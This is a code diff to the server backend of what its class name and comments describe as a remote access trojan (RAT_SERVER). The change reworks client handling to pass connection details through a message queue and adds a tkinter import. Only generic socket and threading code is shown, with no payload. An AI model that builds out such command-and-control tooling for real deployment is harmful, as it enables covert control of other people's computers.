@@ -4,12 +4,14 @@ Date: 2024-12-4 23:02:00
 Desicription: 服务端通信后端
 """
 import socket
+import tkinter as tk
 import threading
 from modules.terminal import Terminal
 from queue import Queue
 from typing import List, Tuple, Union, Generic, TypeVar
 import threading
 import logging
+
 logging.basicConfig(level=logging.DEBUG)
 class RAT_SERVER:
     '''
@@ -35,7 +37,7 @@ class RAT_SERVER:
         # 回调函数，调用gui添加和删除客户端信息
         self.on_client_connected = None
         self.on_client_disconnected = None
-    def build_connection(self):
+    def build_connection(self, msg_queue: Queue):
         '''
         Description:
             类的主线程，循环接受所有客户端连接
@@ -53,11 +55,11 @@ class RAT_SERVER:
             # 循环接受所有客户端连接
             client, addr = s.accept()
             # 接受到连接后，创建一个线程处理子线程
-            client_thread = threading.Thread(target=self.handle_client, args=(client, addr))
+            client_thread = threading.Thread(target=self.handle_client, args=(client, addr, msg_queue))
             # 开启客户端处理子线程
             client_thread.start()
 
-    def handle_client(self, client: socket.socket, addr: socket.AddressInfo):
+    def handle_client(self, client: socket.socket, addr: socket.AddressInfo, msg_queue: Queue):
         '''
         Description:
             处理一个客户端连接，每一个建立连接的客户端对应一个处理线程
@@ -69,11 +71,11 @@ class RAT_SERVER:
         '''
         # 接受客户端ip
         ipcli = client.recv(1024).decode()
-        logging.debug(f"[*] Accepted connection from: {ipcli}")
         # 将客户端信息加入到客户端列表
         self.clients.append((client, *addr, Queue(), Queue()))
         # 回调函数，添加客户端信息到gui
-        self.on_client_connected(*addr)
+        # self.on_client_connected(*addr)
+        msg_queue.put((addr))
         
         # TODO  心跳机制
         
